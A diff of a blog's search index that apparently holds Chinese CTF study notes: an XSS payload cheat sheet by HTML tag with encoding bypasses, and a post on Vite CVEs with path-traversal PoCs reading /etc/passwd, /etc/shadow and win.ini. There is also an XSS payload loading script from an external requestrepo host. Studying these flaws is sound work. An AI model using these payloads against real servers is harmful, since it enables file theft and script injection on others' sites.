+<span class="string">&lt;a href=&quot;</span>x<span class="string">&quot; onfocus=&quot;</span><span class="built_in">alert</span>(<span class="string">&#x27;xss&#x27;</span>);&quot; autofocus=&quot;&quot;&gt;xss&lt;/<span class="selector-tag">a</span>&gt;
+&lt;<span class="selector-tag">a</span> href=&quot;<span class="attribute">x</span>&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/<span class="selector-tag">a</span>&gt;
+&lt;<span class="selector-tag">a</span> href=&quot;<span class="attribute">x</span>&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">a</span>&gt;
+&lt;<span class="selector-tag">a</span> href=&quot;<span class="attribute">x</span>&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">a</span>&gt;
+<span class="comment">/*呃呃，感觉要多记这些属性，反正前端设计也要用到*/</span></code></pre>
+
+<h3 id="-2"><a href="#-2" class="headerlink" title="&lt;img&gt;"></a>&lt;<code>img&gt;</code></h3><p>作为一个图片触发，成功触发会显示一个破损的图片</p>
+<p>元素内部构造:</p>
+<pre><code class="highlight css">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="attribute">x</span> onerror=&quot;alert(<span class="number">1</span>)&quot;&gt;
+&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="attribute">x</span> onerror=eval(&quot;alert(<span class="number">1</span>)&quot;)&gt;
+&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="number">1</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
+&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="number">1</span> onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
+&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="number">1</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</code></pre>
+
+<h3 id="-3"><a href="#-3" class="headerlink" title="&lt;iframe&gt;"></a><code>&lt;iframe&gt;</code></h3><p>内嵌框架元素</p>
+<p>元素内部构造:</p>
+<pre><code class="highlight css">&lt;<span class="selector-tag">iframe</span> <span class="attribute">src</span>=&quot;javascript:<span class="built_in">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt;test&lt;/iframe&gt;</span>
+<span class="string">&lt;iframe onload=&quot;</span><span class="built_in">alert</span>(document.cookie)<span class="string">&quot;&gt;&lt;/iframe&gt;</span>
+<span class="string">&lt;iframe onload=&quot;</span><span class="built_in">alert</span>(<span class="string">&#x27;xss&#x27;</span>);&quot;&gt;&lt;/<span class="selector-tag">iframe</span>&gt;
+&lt;<span class="selector-tag">iframe</span> onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/<span class="selector-tag">iframe</span>&gt;
+&lt;<span class="selector-tag">iframe</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">iframe</span>&gt;
+&lt;<span class="selector-tag">iframe</span> <span class="attribute">src</span>=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre>
+
+<h3 id="-4"><a href="#-4" class="headerlink" title="&lt;audio&gt;"></a><code>&lt;audio&gt;</code></h3><p>音频元素</p>
+<p>元素内部构造:</p>
+<pre><code class="highlight css">&lt;<span class="selector-tag">audio</span> <span class="attribute">src</span>=<span class="number">1</span> onerror=alert(<span class="number">1</span>)&gt;
+&lt;<span class="selector-tag">audio</span>&gt;&lt;<span class="selector-tag">source</span> <span class="attribute">src</span>=&quot;<span class="attribute">x</span>&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">audio</span>&gt;
+&lt;<span class="selector-tag">audio</span> controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/<span class="selector-tag">audio</span>&gt;
+&lt;<span class="selector-tag">audio</span> controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">source</span> <span class="attribute">src</span>=&quot;<span class="attribute">x</span>&quot;&gt;&lt;/<span class="selector-tag">audio</span>&gt;</code></pre>
+
+<h3 id="video"><a href="#video" class="headerlink" title="video"></a><code>video</code></h3><p>视频元素</p>
+<p>元素内部构造:</p>
+<pre><code class="highlight css">&lt;<span class="selector-tag">video</span> <span class="attribute">src</span>=<span class="attribute">x</span> onerror=alert(<span class="number">1</span>)&gt;
+&lt;<span class="selector-tag">video</span>&gt;&lt;<span class="selector-tag">source</span> onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;
+&lt;<span class="selector-tag">video</span> controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;
+&lt;<span class="selector-tag">video</span> controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;
+&lt;<span class="selector-tag">video</span> controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;</code></pre>
+
+<h3 id="svg"><a href="#svg" class="headerlink" title="svg"></a><code>svg</code></h3><p>矢量图片元素</p>
+<p>元素内部构造:</p>
+<pre><code class="highlight css">&lt;<span class="selector-tag">svg</span> onload=javascript:<span class="built_in">alert</span>(<span class="number">1</span>)&gt;
+&lt;svg onload=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/svg&gt;</code></pre>
+
+<h3 id="-5"><a href="#-5" class="headerlink" title="&lt;button&gt;"></a><code>&lt;button&gt;</code></h3><p>元素上点击鼠标时触发（<del>因为人叫button</del></p>
+<p>元素内部构造:</p>
+<pre><code class="highlight css">&lt;<span class="selector-tag">button</span> onclick=alert(<span class="number">1</span>)&gt;
+&lt;<span class="selector-tag">button</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
+&lt;<span class="selector-tag">button</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
+&lt;<span class="selector-tag">button</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
+&lt;<span class="selector-tag">button</span> onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
+&lt;<span class="selector-tag">button</span> onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
+&lt;<span class="selector-tag">button</span> onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">button</span>&gt;</code></pre>
+
+<h3 id="-6"><a href="#-6" class="headerlink" title="&lt;div&gt;"></a><code>&lt;div&gt;</code></h3><p>html当中常规的切割元素，但是需要urlcode来进行绕过</p>
+<pre><code class="highlight css">原代码：
+&lt;<span class="selector-tag">div</span> onmouseover=&#x27;alert(<span class="number">1</span>)&#x27;&gt;<span class="selector-tag">DIV</span>&lt;/<span class="selector-tag">div</span>&gt;
+经过url编码：
+&lt;<span class="selector-tag">div</span> onmouseover%<span class="number">3</span>d&#x27;alert%<span class="number">26</span>lpar%<span class="number">3</span>b1%<span class="number">26</span>rpar%<span class="number">3</span>b&#x27;&gt;<span class="selector-tag">DIV</span>&lt;%<span class="number">2</span>fdiv&gt;</code></pre>
+
+<h3 id="-7"><a href="#-7" class="headerlink" title="&lt;object&gt;"></a><code>&lt;object&gt;</code></h3><p>嵌入对象元素，引入一个外部资源</p>
+<p>这个需要借助 data 伪协议和 base64 编码来实现绕过</p>
+<pre><code class="highlight css">&lt;<span class="selector-tag">object</span> data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/<span class="selector-tag">object</span>&gt;</code></pre>
+
+<h3 id="-8"><a href="#-8" class="headerlink" title="&lt;p&gt; "></a><code>&lt;p&gt; </code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">p</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;
+&lt;<span class="selector-tag">p</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;
+&lt;<span class="selector-tag">p</span> onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;
+&lt;<span class="selector-tag">p</span> onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;</code></pre>
+
+<h3 id="-9"><a href="#-9" class="headerlink" title="&lt;input&gt;"></a><code>&lt;input&gt;</code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">input</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
+&lt;<span class="selector-tag">input</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
+&lt;<span class="selector-tag">input</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;
+&lt;<span class="selector-tag">input</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
+&lt;<span class="selector-tag">input</span> type=&quot;<span class="selector-tag">text</span>&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">input</span>&gt;
+&lt;<span class="selector-tag">input</span> type=&quot;<span class="selector-tag">text</span>&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">input</span>&gt;
+&lt;<span class="selector-tag">input</span> type=&quot;<span class="selector-tag">text</span>&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">input</span>&gt;</code></pre>
+
+<h3 id="-10"><a href="#-10" class="headerlink" title="&lt;details&gt;"></a><code>&lt;details</code>&gt;</h3><pre><code class="highlight css">&lt;<span class="selector-tag">details</span> ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">details</span>&gt;
+&lt;<span class="selector-tag">details</span> ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/<span class="selector-tag">details</span>&gt;</code></pre>
+
+<h3 id="-11"><a href="#-11" class="headerlink" title="&lt;select&gt;"></a><code>&lt;select&gt;</code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">select</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/<span class="selector-tag">select</span>&gt;
+&lt;<span class="selector-tag">select</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">select</span>&gt;
+&lt;<span class="selector-tag">select</span> onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/<span class="selector-tag">select</span>&gt;</code></pre>
+
+<h3 id="-12"><a href="#-12" class="headerlink" title="&lt;form&gt;"></a><code>&lt;form&gt;</code></h3><p>表单元素</p>
+<pre><code class="highlight css">&lt;<span class="selector-tag">form</span> method=&quot;<span class="attribute">x</span>&quot; action=&quot;<span class="attribute">x</span>&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> type=submit&gt;&lt;/<span class="selector-tag">form</span>&gt; 
+&lt;<span class="selector-tag">form</span> method=&quot;<span class="attribute">x</span>&quot; action=&quot;<span class="attribute">x</span>&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> type=submit&gt;&lt;/<span class="selector-tag">form</span>&gt; 
+&lt;<span class="selector-tag">form</span> method=&quot;<span class="attribute">x</span>&quot; action=&quot;<span class="attribute">x</span>&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> type=submit&gt;&lt;/<span class="selector-tag">form</span>&gt;</code></pre>
+
+<h3 id="-13"><a href="#-13" class="headerlink" title="&lt;body&gt;"></a><code>&lt;body&gt;</code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">body</span> onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">body</span>&gt;</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>-CTF -Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vite相关CVE</title>
+    <url>/2025/04/16/Vite%E7%9B%B8%E5%85%B3CVE/</url>
+    <content><![CDATA[<h1 id="Vite相关CVE"><a href="#Vite相关CVE" class="headerlink" title="Vite相关CVE"></a>Vite相关CVE</h1><p>TG遇到了Vite这个东西，出了三个前端的cve题目，都是很新鲜的cve，因此想着了解一下Vite相关的cve，复现可能要等后面学了ts再看了唉唉。。</p>
+<h2 id="CVE-2022-35204"><a href="#CVE-2022-35204" class="headerlink" title="CVE-2022-35204"></a>CVE-2022-35204</h2><p>Vite的一个任意文件读取漏洞</p>
+<p>vite 默认启用的 <code>/@fs/</code> 路由用于访问任意本地文件</p>
+<p>但是正常访问是会被block的</p>
+<p>但是可以利用<code>../</code>绕过进行任意文件读</p>
+<p>目前还未复现，贴上别的师傅打好的poc</p>
+<pre><code class="highlight plaintext">curl --path-as-is http://localhost:3000/@fs/home/swwind/tmp/cve/CVE-2022-35204/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/hosts
+//原链接 https://blog.sww.moe/post/exploits/cve-2022-35204/</code></pre>
+
+<p>这个漏洞的成因大概就是decodeURI这个函数的漏洞</p>
+<pre><code class="highlight plaintext">decodeURI在解码时会将大部分的ASCII标点符号和预留字符保留不变，包括/和%2f
+这样就会导致/../未被检测到而绕过了安全检测
+传入的/home/swwind/tmp/cve/CVE-2022-35204/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/hosts 的时候，decodeURI 函数解析出来的结果会保留其中的所有 %2f，再经由下一步的 path.resolve 函数解析，最终结果是 /home/swwind/tmp/cve/CVE-2022-35204/..%2f..%2f..%2f..%2f../etc/hosts，由此非常轻松地就绕过了 vite 的允许目录检查。</code></pre>
+
+<p>相比之下，decodeURIcomponent就要好一些，因为其解码 URI 组件中的字符，而不是完整的 URI。它可以正确解码任何 ASCII 字符或 UTF-8 字符集，包括默认 URI 编码中使用的所有预留字符和其他特殊字符</p>
+<p>在decodeURIcomponent的处理后，传入的参数被解析为<code>/home/swwind/tmp/cve/CVE-2022-35204/../../../../../etc/hosts</code>，会被正确过滤为<code>/etc/hosts</code>，从而防御了任意文件读取</p>
+<h2 id="CVE-2023-49293"><a href="#CVE-2023-49293" class="headerlink" title="CVE-2023-49293"></a>CVE-2023-49293</h2><p>Vite的一个XSS漏洞</p>
+<p>复现可能要回头了把<a href="https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97">XSS vulnerability in <code>server.transformIndexHtml</code> via URL payload · Advisory · vitejs&#x2F;vite · GitHub</a></p>
+<p>poc就是直接在后面query打一个普通的反射xss语句，直接弹</p>
+<pre><code class="highlight plaintext">?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E
+//?&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(&#x27;boom&#x27;)&lt;/script&gt;</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416124525018.png" alt="image-20250416124525018"></p>
+<p>再尝试构造弹了一下</p>
+<pre><code class="highlight plaintext">?&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://71g9hx8u.requestrepo.com/&quot;;&gt; &lt; /script&gt;</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416125624323.png" alt="image-20250416125624323"></p>
+<h2 id="CVE-2025-30208"><a href="#CVE-2025-30208" class="headerlink" title="CVE-2025-30208"></a>CVE-2025-30208</h2><p>还是相同的<code>@fs</code>的利用</p>
+<p>这边贴poc，回头会补复现</p>
+<pre><code class="highlight plaintext">/@fs/etc/passwd?import&amp;raw??
+/@fs/etc/passwd?raw??</code></pre>
+
+<p><a href="https://www.xaitx.com/tech/2025-03-26.html">Vite 任意文件读取漏洞分析复现（CVE-2025-30208） | 小艾博客</a></p>
+<h2 id="CVE-2025-31125"><a href="#CVE-2025-31125" class="headerlink" title="CVE-2025-31125"></a>CVE-2025-31125</h2><p>这个洞是利用inline的规则配合.wsam进行绕过(是对上一个CVE的补丁的绕过)</p>
+<pre><code class="highlight plaintext">/@fs/C://windows/win.ini?import&amp;inline=1.wasm?init
+还有两个下面那个大佬打出来的未公开poc//适用6.2.4
+/@fs/etc/passwd?import&amp;?meteorkai.svg?.wasm?init
+/@fs/etc/shadow?meteorkai.svg?.wasm?init  //这里没有import是因为读取的文件没有后缀，isJSRequest为true</code></pre>
+
+<p>这边引用一下大佬的解释好了</p>
+<pre><code class="highlight plaintext">除了?url和?raw还有一种内联的方法?inline，他的作用是：
+将文件（如图片、字体、WASM 等）的内容转换为 Base64 编码字符串 或 直接嵌入到 JS/HTML/CSS 中，避免额外的 HTTP 请求
+?init主要用于 WebAssembly（.wasm）文件的初始化，默认只有.wasm支持?init其他如.data、.bin可以通过插件拓展支持
+通过这种新的方法绕过了修复后的正则过滤
+//原链接https://cloud.tencent.com/developer/article/2513407</code></pre>
+
+<p><a href="https://xz.aliyun.com/news/17655">Vite开发服务器任意文件读取漏洞分析复现（CVE-2025-31125）-先知社区</a></p>
+<h2 id="CVE-2025-31486"><a href="#CVE-2025-31486" class="headerlink" title="CVE-2025-31486"></a>CVE-2025-31486</h2><p>先贴出poc</p>
+<pre><code class="highlight plaintext">/etc/passwd?.svg?.wasm?init
+/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw</code></pre>
+
+<p><a href="https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x">原链</a></p>
+<p>其中第二个poc是需要先探出大概的路径才能打的</p>
+<p><a href="https://xz.aliyun.com/news/17730">Vite开发服务器任意文件读取漏洞分析复现（CVE-2025-31486）-先知社区</a></p>
+<h2 id="CVE-2025-32395"><a href="#CVE-2025-32395" class="headerlink" title="CVE-2025-32395"></a>CVE-2025-32395</h2><p>poc</p>
+<pre><code class="highlight plaintext">curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173</code></pre>
+
+<p><a href="https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4">原链</a></p>
+<p><a href="https://xz.aliyun.com/news/17745">Vite任意文件读取bypass调试分析（CVE-2025-32395）-先知社区</a></p>
+]]></content>
+      <tags>
+        <tag>-CVE -Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>磨好的利剑:PHP原生类</title>
     <url>/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
     <content><![CDATA[<h1 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h1><p>相当综合的应用呢，利用面广的不行，爽赤</p>
@@ -9392,193 +9579,6 @@ $zip-&gt;close();
 ]]></content>
       <tags>
         <tag>-Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>详解XSS注入</title>
-    <url>/2025/03/15/%E8%AF%A6%E8%A7%A3XSS%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="XSS注入"><a href="#XSS注入" class="headerlink" title="XSS注入"></a>XSS注入</h1><pre><code class="highlight plaintext">&quot;球球你了！就让我插一句话，我什么都会做的!!!&quot;
-
-&quot;byd被我注入了吧&quot;</code></pre>
-
-<h2 id="认识XSS攻击"><a href="#认识XSS攻击" class="headerlink" title="认识XSS攻击"></a>认识XSS攻击</h2><p>XSS全称是Cross Site Scripting即跨站脚本，当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就发生了。</p>
-<ul>
-<li><p>XSS 的运行原理是将恶意的 script 脚本插入进 html&#x2F;css&#x2F;js 文件当中。（通过在html标准的语句后触发事件，而事件则是执行恶意js</p>
-<p>代码）</p>
-</li>
-</ul>
-<p>作为一种HTML注入攻击，XSS攻击的核心思想就是在HTML页面中注入恶意代码，而XSS采用的注入方式是非常巧妙的。在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。</p>
-<p>由于有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访 问目标服务器上被注入恶意脚本的页面后，由于它对目标服务器的信任，这段恶意脚本的执行不会受到什么阻碍。而此时，攻击者的目的就已经达到了。</p>
-<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><pre><code class="highlight plaintext">又称**非持久型XSS**。之所以称为反射型XSS，是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的：发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，故叫反射型XSS。 而称为非持久型XSS，则是因为这种攻击方式具有一次性，由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用。
-
-攻击者通过电子邮件等方式给别人发送带有恶意脚本代码参数的 URL，当 URL 地址被打开时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，特有的恶意代码参数被 HTML 解析、执行。
-
-非持久型 XSS 漏洞攻击的**四大特点**：① 即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据；②攻击者需要诱骗点击；③反馈率低，所以较难发现和响应修复；④盗取用户敏感保密信息。
-
-防止出现非持久型 XSS 漏洞的**五大措施**：① Web 页面渲染的所有内容或者渲染的数据都必须来自于服务端；②尽量不要从 URL，document.referrer，document.forms 等这种 DOM API 中获取数据直接渲染；③尽量不要使用 eval, new Function()，document.write()，document.writeln()，window.setInterval()，window.setTimeout()，innerHTML，document.creteElement() 等可执行字符串的方法；④如果做不到以上几点，也必须对涉及 DOM 渲染的方法传入的字符串参数做 escape 转义；⑤ 前端渲染的时候对任何的字段都需要做 escape 转义编码</code></pre>
-
-<p>反射型 XSS 的 Payload 如下</p>
-<pre><code class="highlight plaintext">&lt;script&gt;alert(1)&lt;script&gt;</code></pre>
-
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ul>
-<li>“&gt;闭合绕过</li>
-</ul>
-<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><pre><code class="highlight plaintext">存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。
-
-一般存在于 Form 表单提交等交互功能，如发帖留言，提交文本信息等，黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。
-
-这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。
-
-可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入一个页面当中，所有访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型的XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入的往往是一些我们所信任的页面，因此无论我们多么小心，都难免会受到攻击。可以说，存储型XSS更具有隐蔽性，带来的危害也更大，除非服务器能完全阻止注入，否则任何人都很有可能受到攻击。
-
-持久型 XSS 的三**大特点**：①持久性，植入在数据库中；②危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡；③ 盗取用户敏感私密信息。
-
-防止持久型 XSS 漏洞的**三大措施：** ①后端在入库前应该选择不相信任何前端数据，将所有的字段统一进行转义处理；②后端在输出给前端数据统一进行转义处理；③前端在渲染页面 DOM 的时候应该选择不相信任何后端数据，任何字段都需要做转义处理。</code></pre>
-
-
-
-<h2 id="DOM-based-型"><a href="#DOM-based-型" class="headerlink" title="DOM-based 型"></a>DOM-based 型</h2><pre><code class="highlight plaintext">客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 [DOM-based XSS](https://zhida.zhihu.com/search?content_id=164263694&amp;content_type=Article&amp;match_order=1&amp;q=DOM-based+XSS&amp;zhida_source=entity) 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。</code></pre>
-
-
-
-<h2 id="基于字符集的-XSS"><a href="#基于字符集的-XSS" class="headerlink" title="基于字符集的 XSS"></a>基于字符集的 XSS</h2><pre><code class="highlight plaintext">哪怕现在很多的浏览器以及各种开源的库都专门针对了 XSS 进行转义处理，尽量默认抵御绝大多数 XSS 攻击，但是还是有很多方式可以绕过转义规则，让人防不胜防。比如「基于字符集的 XSS 攻击」就是绕过这些转义处理的一种攻击方式，比如有些 Web 页面字符集不固定，用户输入非期望字符集的字符，有时会绕过转义过滤规则。
-
-可以形成「基于字符集的 XSS 攻击」的原因是由于浏览器在 meta 没有指定 charset 的时候有自动识别编码的机制，所以这类攻击通常就是发生在没有指定或者没来得及指定 meta 标签的 charset 的情况下。
-
-避免基于字符集的 XSS 攻击的**两大方法：**①记住指定 &lt;meta charset=&quot;utf-8&quot;&gt;；② XML 中不仅要指定字符集为 utf-8，而且标签要闭合。</code></pre>
-
-
-
-<h2 id="基于-Flash-的跨站-XSS"><a href="#基于-Flash-的跨站-XSS" class="headerlink" title="基于 Flash 的跨站 XSS"></a>基于 Flash 的跨站 XSS</h2><pre><code class="highlight plaintext">基于 Flash 的跨站 XSS 也是属于反射型 XSS 的一种，AS 脚本可以接受用户输入并操作 cookie，攻击者可以配合其他 XSS（持久型或者非持久型）方法将恶意 swf 文件嵌入页面中。主要是因为 AS 有时候需要和 JS 传参交互，攻击者会通过恶意的 XSS 注入篡改参数，窃取并操作cookie。
-
-基于 Flash 的跨站 XSS 的**两种避免方法** **：**①严格管理 cookie 的读写权限；②对 Flash 能接受用户输入的参数进行过滤 escape 转义处理。</code></pre>
-
-
-
-<h2 id="未经验证的跳转-XSS"><a href="#未经验证的跳转-XSS" class="headerlink" title="未经验证的跳转 XSS"></a>未经验证的跳转 XSS</h2><pre><code class="highlight plaintext">有一些场景是后端需要对一个传进来的待跳转的 URL 参数进行一个 302 跳转，可能其中会带有一些用户的敏感（cookie）信息。如果服务器端做302 跳转，跳转的地址来自用户的输入，攻击者可以输入一个恶意的跳转地址来执行脚本。
-
-防止未经验证的跳转 XSS漏洞的**两种措施：**①对待跳转的 URL 参数做白名单或者某种规则过滤；②后端注意对敏感信息的保护, 比如 cookie 使用来源验证。</code></pre>
-
-<h2 id="XSS-BOT"><a href="#XSS-BOT" class="headerlink" title="XSS BOT"></a>XSS BOT</h2><h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2><h2 id="常用标签语句"><a href="#常用标签语句" class="headerlink" title="常用标签语句"></a>常用标签语句</h2><h3 id><a href="#" class="headerlink" title="&lt;script&gt;"></a><code>&lt;script&gt;</code></h3><p>哈哈，经典款，鉴定为第一个过滤的</p>
-<p>元素内部构造:</p>
-<pre><code class="highlight css">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;
-&lt;script&gt;alert(/xss/)&lt;/script&gt;
-&lt;script&gt;alert(<span class="number">123</span>)&lt;/script&gt;</code></pre>
-
-<h3 id="-1"><a href="#-1" class="headerlink" title="&lt;a&gt;"></a><code>&lt;a&gt;</code></h3><p>也是经典款(指html里面)</p>
-<p>元素内部构造:</p>
-<pre><code class="highlight css">&lt;<span class="selector-tag">a</span> href=&quot;javascript:<span class="built_in">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt;test&lt;/a&gt;</span>
-<span class="string">&lt;a href=&quot;</span>x<span class="string">&quot; onfocus=&quot;</span><span class="built_in">alert</span>(<span class="string">&#x27;xss&#x27;</span>);&quot; autofocus=&quot;&quot;&gt;xss&lt;/<span class="selector-tag">a</span>&gt;
-&lt;<span class="selector-tag">a</span> href=&quot;<span class="attribute">x</span>&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/<span class="selector-tag">a</span>&gt;
-&lt;<span class="selector-tag">a</span> href=&quot;<span class="attribute">x</span>&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">a</span>&gt;
-&lt;<span class="selector-tag">a</span> href=&quot;<span class="attribute">x</span>&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">a</span>&gt;
-<span class="comment">/*呃呃，感觉要多记这些属性，反正前端设计也要用到*/</span></code></pre>
-
